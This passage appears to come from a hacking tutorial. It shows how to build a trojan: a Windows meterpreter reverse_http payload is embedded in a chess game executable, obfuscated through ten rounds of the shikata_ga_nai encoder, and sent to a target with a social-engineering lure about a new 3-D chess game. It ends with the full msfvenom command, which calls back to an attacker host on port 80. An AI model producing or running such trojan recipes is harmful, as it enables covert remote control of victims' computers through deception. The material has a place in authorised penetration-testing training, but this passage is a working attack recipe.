  md: 'Let’s use the Windows meterpreter that communicates over http, so that looks
    like normal HTTP traffic (windows/x86/meterpreter/reverse\_http).


    Note that we are using the 32-bit version (x86). We are using the 32-bit version
    to make certain that it can execute on any Windows system, 32-bit or 64-  bit.


    Next, let’s decide to embed this payload inside a chess game and make it a Windows
    .exe file. This would enable us to send it to the target with some rudimentary
    social engineering such as “Let’s play a new online chess game. I have this great
    new 3-D  chess game!”.


    Lastly, let’s obscure our payload with the encoder shikata\_ga\_nai and run it
    through 10 iterations of this encoder (more iterations make it more obscure, but
    also make the file larger).


    To create this malicious file, we would enter the following;


    ```

    kali > msfvenom -p windows/meterpreter/reverse\_http

    LHOST=192.168.0.114


    LPORT=80 -x /root/chess.exe -e x86/shikata\_ga\_nai -i 10 -f

    exe >newchess.exe

    ```


